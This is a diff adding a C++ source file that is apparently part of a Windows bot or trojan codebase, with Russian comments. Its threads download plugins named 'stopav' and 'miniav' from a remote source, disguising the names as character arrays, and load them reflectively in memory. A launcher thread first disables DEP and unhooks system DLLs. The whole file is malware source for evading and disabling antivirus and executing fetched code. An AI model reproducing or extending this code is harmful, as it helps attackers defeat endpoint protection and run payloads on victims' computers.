@@ -1,0 +1,91 @@
+#include <windows.h>
+
+#include "GetApi.h"
+#include "DllLoader.h"
+#include "BotUtils.h"
+#include "Memory.h"
+#include "Strings.h"
+#include "Config.h"
+#include "Crypt.h"
+#include "Utils.h"
+#include "Inject.h"
+#include "Unhook.h"
+#include "Loader.h"
+#include "Plugins.h"
+
+
+DWORD WINAPI AvBlockThread( LPVOID lpData )
+{
+//	if (FileExistsW(GetStopAVPath()))
+//		return 0;
+
+	// Загружаем плагин
+
+	const static char AvBlockPlugin[] = {'s','t','o','p','a','v','.','p','l','u','g',0};
+
+    DWORD Size = 0;
+	LPVOID Module = Plugin::Download((PCHAR)AvBlockPlugin, NULL, &Size);
+	if (Module == NULL) return 0;
+
+	//Создаём пустой файл, для сигнализации о загруженном плагине
+//	File::WriteBufferW(GetStopAVPath(), NULL, 0);
+
+
+    // Выполняем код из библиотеки
+    HMEMORYMODULE Lib = MemoryLoadLibrary(Module);
+
+	if ( Lib != NULL )
+		MemoryFreeLibrary(Lib);
+
+
+    MemFree(Module);
+	return 0;
+}
+
+
+DWORD WINAPI MiniAVThread( LPVOID lpData )
+{
+//	if (FileExistsW(GetMiniAVPath()))
+//		return 0;
+
+	// Загружаем плагин
+
+	const static char MiniAVPlugin[] = {'m','i','n','i','a','v','.','p','l','u','g',0};;
+
+	DWORD Size = 0;
+	LPVOID Module = Plugin::Download((PCHAR)MiniAVPlugin, NULL, &Size);
+	if (Module == NULL) return 0;
+
+	//Создаём пустой файл, для сигнализации о загруженном плагине
+//	File::WriteBufferW(GetMiniAVPath(), NULL, 0);
+
+
+    // Выполняем код из библиотеки
+    HMEMORYMODULE Lib = MemoryLoadLibrary(Module);
+
+	if ( Lib != NULL )
+		MemoryFreeLibrary(Lib);
+
+
+    MemFree(Module);
+	return 0;
+}
+
+
+DWORD WINAPI AvFuckThread( LPVOID lpData )
+{
+	DisableDEP();
+	UnhookDlls();
+
+	HANDLE hBlockAV = StartThread( AvBlockThread, NULL );
+	HANDLE hMiniAV  = StartThread( MiniAVThread, NULL );
+	
+	pWaitForSingleObject( hBlockAV, INFINITE );
+	pWaitForSingleObject( hMiniAV, INFINITE  );
+	
+//	pExitProcess( 1 );
+
+	return 0;
+}
+
+
